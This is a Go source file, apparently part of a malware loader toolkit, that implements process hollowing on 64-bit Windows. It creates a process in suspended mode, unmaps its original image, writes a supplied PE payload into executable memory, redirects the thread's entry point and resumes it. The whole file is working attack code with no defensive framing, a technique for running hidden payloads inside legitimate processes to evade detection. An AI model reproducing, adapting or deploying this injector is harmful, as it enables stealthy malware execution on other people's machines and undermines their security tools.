package inject

import (
	"bytes"
	"debug/pe"
	"encoding/binary"
	"fmt"
	"syscall"
	"unsafe"
	"variant/log"

	"golang.org/x/sys/windows"
)

// Inject starts the src process and injects the target process.
func Inject(srcPath string, sc []byte) {
	// 注入目标进程路径
	cmd, err := windows.UTF16PtrFromString(srcPath)
	if err != nil {
		panic(err)
	}
	log.Infof("Creating process: %v", srcPath)

	// 设置 PE 信息
	si := new(windows.StartupInfo)
	pi := new(windows.ProcessInformation)

	// CREATE_SUSPENDED := 0x00000004
	err = windows.CreateProcess(cmd, nil, nil, nil, false, 0x00000004, nil, nil, si, pi)
	if err != nil {
		panic(err)
	}

	hProcess := uintptr(pi.Process)
	hThread := uintptr(pi.Thread)
	// 创建进程
	log.Infof("Process created. Process: %v, Thread: %v", hProcess, hThread)
	// 获取线程上下文
	log.Infof("Getting thread context of %v", hThread)

	ctx := make([]uint8, 1232)
	// ctx[12] = 0x00100000 | 0x00000002 //CONTEXT_INTEGER flag to Rdx
	binary.LittleEndian.PutUint32(ctx[48:], 0x00100000|0x00000002)
	// other offsets can be found at https://stackoverflow.com/questions/37656523/declaring-context-struct-for-pinvoke-windows-x64
	ctxPtr := unsafe.Pointer(&ctx[0])
	r, _, err := procGetThreadContext.Call(hThread, uintptr(ctxPtr))
	if r == 0 {
		log.Fatalf("GetThreadContext err: %v", err)
	}
	log.Infof("GetThreadContext[%v]: [%v] %v", hThread, r, err)

	// https://stackoverflow.com/questions/37656523/declaring-context-struct-for-pinvoke-windows-x64
	Rdx := binary.LittleEndian.Uint64(ctx[136:])

	log.Infof("Address to PEB[Rdx]: %x", Rdx)

	//https://bytepointer.com/resources/tebpeb64.htm
	baseAddr, err := ReadProcessMemoryAsAddr(hProcess, uintptr(Rdx+16))
	if err != nil {
		panic(err)
	}

	log.Infof("Base Address of Source Image from PEB[ImageBaseAddress]: %x", baseAddr)

	//Had to modify the behavior of the POC to get it working -----------------------------------------------------------------------------------------------------------------------------------

	log.Infof("Reading destination PE")
	destPE := sc

	destPEReader := bytes.NewReader(destPE)
	if err != nil {
		panic(err)
	}

	f, err := pe.NewFile(destPEReader)

	log.Infof("Getting OptionalHeader of destination PE")
	oh, ok := f.OptionalHeader.(*pe.OptionalHeader64)
	if !ok {
		panic("OptionalHeader64 not found")
	}

	log.Infof("ImageBase of destination PE[OptionalHeader.ImageBase]: %x", oh.ImageBase)
	log.Infof("Unmapping view of section %x", baseAddr)
	if err := NtUnmapViewOfSection(hProcess, baseAddr); err != nil {
		panic(err)
	}

	log.Infof("Allocating memory in process at %x (size: %v)", baseAddr, oh.SizeOfImage)
	// MEM_COMMIT := 0x00001000
	// MEM_RESERVE := 0x00002000
	// PAGE_EXECUTE_READWRITE := 0x40
	newImageBase, err := VirtualAllocEx(hProcess, baseAddr, oh.SizeOfImage, 0x00002000|0x00001000, 0x40)
	if err != nil {
		panic(err)
	}
	log.Infof("New base address %x", newImageBase)
	log.Infof("Writing PE to memory in process at %x (size: %v)", newImageBase, oh.SizeOfHeaders)
	err = WriteProcessMemory(hProcess, newImageBase, destPE, oh.SizeOfHeaders)
	if err != nil {
		panic(err)
	}

	for _, sec := range f.Sections {
		log.Infof("Writing section[%v] to memory at %x (size: %v)", sec.Name, newImageBase+uintptr(sec.VirtualAddress), sec.Size)
		secData, err := sec.Data()
		if err != nil {
			panic(err)
		}
		err = WriteProcessMemory(hProcess, newImageBase+uintptr(sec.VirtualAddress), secData, sec.Size)
		if err != nil {
			panic(err)
		}
	}
	log.Infof("Calcuating relocation delta")
	delta := int64(oh.ImageBase) - int64(newImageBase)
	log.Infof("Relocation delta: %v", delta)

	if delta != 0 && false {
		log.Infof("Finding relocation directory")
		rel := oh.DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_BASERELOC]
		log.Infof("Relocation directory %x (size: %v)", rel.VirtualAddress, rel.Size)

		log.Infof("Locating relocation section")
		relSec := findRelocSec(rel.VirtualAddress, f.Sections)
		if relSec == nil {
			panic(fmt.Sprintf(".reloc not found at %x", rel.VirtualAddress))
		}
		log.Infof("Relocation section %x (size: %v)", relSec.VirtualAddress, relSec.Size)
		var read uint32
		d, err := relSec.Data()
		if err != nil {
			panic(err)
		}
		rr := bytes.NewReader(d)
		for read < rel.Size {
			log.Infof("Reading relocation header")
			dd := new(pe.DataDirectory)
			binary.Read(rr, binary.LittleEndian, dd)
			log.Infof("Relocation header %x (size: %v)", dd.VirtualAddress, dd.Size)

			read += 8
			reSize := (dd.Size - 8) / 2
			log.Infof("Relocation entries %v", reSize)
			re := make([]baseRelocEntry, reSize)
			read += reSize * 2
			binary.Read(rr, binary.LittleEndian, re)
			for _, rrr := range re {
				log.Infof("Relocation entry: Type: %x  Offset: %x", rrr.Type(), rrr.Offset()+dd.VirtualAddress)
				if rrr.Type() == IMAGE_REL_BASED_DIR64 {
					rell := newImageBase + uintptr(rrr.Offset()) + uintptr(dd.VirtualAddress)
					raddr, err := ReadProcessMemoryAsAddr(hProcess, rell)
					if err != nil {
						panic(err)
					}

					err = WriteProcessMemoryAsAddr(hProcess, rell, uintptr(int64(raddr)+delta))
					if err != nil {
						panic(err)
					}

				} else {
					log.Infof("Invalid relocation entry type found %v", rrr.Type())
				}
			}
		}

	}
	log.Infof("Writing new ImageBase to Rdx %x", newImageBase)
	addrB := make([]byte, 8)
	binary.LittleEndian.PutUint64(addrB, uint64(newImageBase))
	err = WriteProcessMemory(hProcess, uintptr(Rdx+16), addrB, 8)
	if err != nil {
		panic(err)
	}

	binary.LittleEndian.PutUint64(ctx[128:], uint64(newImageBase)+uint64(oh.AddressOfEntryPoint))
	log.Infof("Setting new entrypoint to Rcx %x", uint64(newImageBase)+uint64(oh.AddressOfEntryPoint))

	log.Infof("Setting thread context %v", hThread)
	err = SetThreadContext(hThread, ctx)
	if err != nil {
		panic(err)
	}

	log.Infof("Resuming thread %v", hThread)
	_, err = ResumeThread(hThread)
	if err != nil {
		panic(err)
	}

}

var (
	modkernel32 = syscall.NewLazyDLL("kernel32.dll")

	procWriteProcessMemory = modkernel32.NewProc("WriteProcessMemory")
	procReadProcessMemory  = modkernel32.NewProc("ReadProcessMemory")
	procVirtualAllocEx     = modkernel32.NewProc("VirtualAllocEx")
	procGetThreadContext   = modkernel32.NewProc("GetThreadContext")
	procSetThreadContext   = modkernel32.NewProc("SetThreadContext")
	procResumeThread       = modkernel32.NewProc("ResumeThread")

	modntdll = syscall.NewLazyDLL("ntdll.dll")

	procNtUnmapViewOfSection = modntdll.NewProc("NtUnmapViewOfSection")
)

func ResumeThread(hThread uintptr) (count int32, e error) {

	// DWORD ResumeThread(
	// 	HANDLE hThread
	// );

	ret, _, err := procResumeThread.Call(hThread)
	if ret == 0xffffffff {
		e = err
	}
	count = int32(ret)
	log.Infof("ResumeThread[%v]: [%v] %v", hThread, ret, err)
	return
}

func VirtualAllocEx(hProcess uintptr, lpAddress uintptr, dwSize uint32, flAllocationType int, flProtect int) (addr uintptr, e error) {

	// LPVOID VirtualAllocEx(
	// 	HANDLE hProcess,
	// 	LPVOID lpAddress,
	// 	SIZE_T dwSize,
	// 	DWORD  flAllocationType,
	// 	DWORD  flProtect
	//  );

	ret, _, err := procVirtualAllocEx.Call(
		hProcess,
		lpAddress,
		uintptr(dwSize),
		uintptr(flAllocationType),
		uintptr(flProtect))
	if ret == 0 {
		e = err
	}
	addr = ret
	log.Infof("VirtualAllocEx[%v : %x]: [%v] %v", hProcess, lpAddress, ret, err)

	return
}

func ReadProcessMemory(hProcess uintptr, lpBaseAddress uintptr, size uint32) (data []byte, e error) {

	// BOOL ReadProcessMemory(
	// 	HANDLE  hProcess,
	// 	LPCVOID lpBaseAddress,
	// 	LPVOID  lpBuffer,
	// 	SIZE_T  nSize,
	// 	SIZE_T  *lpNumberOfBytesRead
	//  );

	var numBytesRead uintptr
	data = make([]byte, size)

	r, _, err := procReadProcessMemory.Call(hProcess,
		lpBaseAddress,
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(size),
		uintptr(unsafe.Pointer(&numBytesRead)))
	if r == 0 {
		e = err
	}
	log.Infof("ReadProcessMemory[%v : %x]: [%v] %v", hProcess, lpBaseAddress, r, err)
	return
}

func WriteProcessMemory(hProcess uintptr, lpBaseAddress uintptr, data []byte, size uint32) (e error) {

	// BOOL WriteProcessMemory(
	// 	HANDLE  hProcess,
	// 	LPVOID  lpBaseAddress,
	// 	LPCVOID lpBuffer,
	// 	SIZE_T  nSize,
	// 	SIZE_T  *lpNumberOfBytesWritten
	// );

	var numBytesRead uintptr

	r, _, err := procWriteProcessMemory.Call(hProcess,
		lpBaseAddress,
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(size),
		uintptr(unsafe.Pointer(&numBytesRead)))
	if r == 0 {
		e = err
	}
	log.Infof("WriteProcessMemory[%v : %x]: [%v] %v", hProcess, lpBaseAddress, r, err)

	return
}

func ReadProcessMemoryAsAddr(hProcess uintptr, lpBaseAddress uintptr) (val uintptr, e error) {
	data, err := ReadProcessMemory(hProcess, lpBaseAddress, 8)
	if err != nil {
		e = err
	}
	val = uintptr(binary.LittleEndian.Uint64(data))
	log.Infof("ReadProcessMemoryAsAddr[%v : %x]: [%x] %v", hProcess, lpBaseAddress, val, err)
	return
}

func WriteProcessMemoryAsAddr(hProcess uintptr, lpBaseAddress uintptr, val uintptr) (e error) {
	buf := make([]byte, 8)
	binary.LittleEndian.PutUint64(buf, uint64(val))
	err := WriteProcessMemory(hProcess, lpBaseAddress, buf, 8)
	if err != nil {
		e = err
	}
	log.Infof("WriteProcessMemoryAsAddr[%v : %x]: %v", hProcess, lpBaseAddress, err)
	return
}

func NtUnmapViewOfSection(hProcess uintptr, baseAddr uintptr) (e error) {

	// https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/wdm/nf-wdm-zwunmapviewofsection
	// https://msdn.microsoft.com/en-us/windows/desktop/ff557711
	// https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtUnmapViewOfSection.html

	// NTSTATUS NtUnmapViewOfSection(
	// 	HANDLE    ProcessHandle,
	// 	PVOID     BaseAddress
	// );

	r, _, err := procNtUnmapViewOfSection.Call(hProcess, baseAddr)
	if r != 0 {
		e = err
	}
	log.Infof("NtUnmapViewOfSection[%v : %x]: [%v] %v", hProcess, baseAddr, r, err)
	return
}

func SetThreadContext(hThread uintptr, ctx []uint8) (e error) {

	// BOOL SetThreadContext(
	// 	HANDLE        hThread,
	// 	const CONTEXT *lpContext
	// );

	ctxPtr := unsafe.Pointer(&ctx[0])
	r, _, err := procSetThreadContext.Call(hThread, uintptr(ctxPtr))
	if r == 0 {
		e = err
	}
	log.Infof("SetThreadContext[%v]: [%v] %v", hThread, r, err)
	return
}

type baseRelocEntry uint16

func (b baseRelocEntry) Type() IMAGE_REL_BASED {
	return IMAGE_REL_BASED(uint16(b) >> 12)
}

func (b baseRelocEntry) Offset() uint32 {
	return uint32(uint16(b) & 0x0FFF)
}

func findRelocSec(va uint32, secs []*pe.Section) *pe.Section {
	for _, sec := range secs {
		if sec.VirtualAddress == va {
			return sec
		}
	}
	return nil
}
